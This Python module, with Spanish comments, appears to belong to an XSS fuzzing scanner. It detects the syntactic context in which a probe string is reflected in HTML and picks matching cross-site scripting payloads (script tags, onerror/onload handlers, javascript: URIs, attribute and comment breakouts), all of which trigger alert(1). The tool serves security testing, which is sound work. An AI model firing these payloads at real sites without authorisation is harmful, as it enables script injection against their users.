"""
Módulo de Análisis Contextual de Reflejo y Generación de Payloads (Context-Aware Fuzzing).
Inspecciona el Document Object Model (DOM) donde se refleja un parámetro para determinar el
contexto sintáctico exacto (cuerpo HTML, atributo, script o comentario) y generar payloads quirúrgicos.
"""
from __future__ import annotations

import re
from typing import Literal

ContextType = Literal[
    "HTML_BODY",
    "ATTR_VALUE",
    "URI_ATTR",
    "SCRIPT_BLOCK",
    "HTML_COMMENT",
]

CONTEXTUAL_PAYLOADS: dict[str, list[str]] = {
    "HTML_BODY": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ],
    "ATTR_VALUE": [
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
    ],
    "URI_ATTR": [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
    ],
    "SCRIPT_BLOCK": [
        "';alert(1)//",
        '";alert(1)//',
        "</script><script>alert(1)</script>",
        "-alert(1)-",
    ],
    "HTML_COMMENT": [
        "--> <script>alert(1)</script>",
        "--><svg onload=alert(1)>",
    ],
}


def detect_reflection_context(html_content: str, probe: str) -> list[ContextType]:
    """
    Analiza las posiciones donde se refleja la sonda (probe) en el código HTML
    y clasifica el contexto sintáctico de cada ocurrencia.
    """
    if not html_content or not probe or probe not in html_content:
        return []

    contexts: set[ContextType] = set()
    start_pos = 0

    while True:
        idx = html_content.find(probe, start_pos)
        if idx == -1:
            break

        prefix = html_content[:idx]

        # 1. Comprobar si está dentro de un comentario HTML (<!-- ... -->)
        last_comment_open = prefix.rfind("<!--")
        last_comment_close = prefix.rfind("-->")
        if last_comment_open > last_comment_close:
            contexts.add("HTML_COMMENT")
            start_pos = idx + len(probe)
            continue

        # 2. Comprobar si está dentro de un bloque <script> ... </script>
        last_script_open = prefix.rfind("<script")
        last_script_close = prefix.rfind("</script")
        if last_script_open > last_script_close:
            contexts.add("SCRIPT_BLOCK")
            start_pos = idx + len(probe)
            continue

        # 3. Comprobar si está dentro de los atributos de una etiqueta HTML (<tag attr="probe">)
        last_tag_open = prefix.rfind("<")
        last_tag_close = prefix.rfind(">")
        if last_tag_open > last_tag_close:
            tag_context = prefix[last_tag_open:]
            # Verificar si está en un atributo de tipo enlace (href, src, action)
            if re.search(r'\b(?:href|src|action|data)\s*=\s*["\']?[^"\'>]*$', tag_context, re.IGNORECASE):
                contexts.add("URI_ATTR")
            else:
                contexts.add("ATTR_VALUE")
            start_pos = idx + len(probe)
            continue

        # 4. Contexto por defecto: Cuerpo del documento HTML
        contexts.add("HTML_BODY")
        start_pos = idx + len(probe)

    return sorted(list(contexts))


def generate_contextual_payloads(contexts: list[ContextType]) -> list[str]:
    """
    Retorna la lista ordenada de payloads optimizados para los contextos detectados.
    Si no se detectaron contextos específicos, retorna los payloads estándar de XSS.
    """
    if not contexts:
        return CONTEXTUAL_PAYLOADS["HTML_BODY"].copy()

    selected_payloads: list[str] = []
    seen: set[str] = set()

    for ctx in contexts:
        for p in CONTEXTUAL_PAYLOADS.get(ctx, []):
            if p not in seen:
                seen.add(p)
                selected_payloads.append(p)

    return selected_payloads
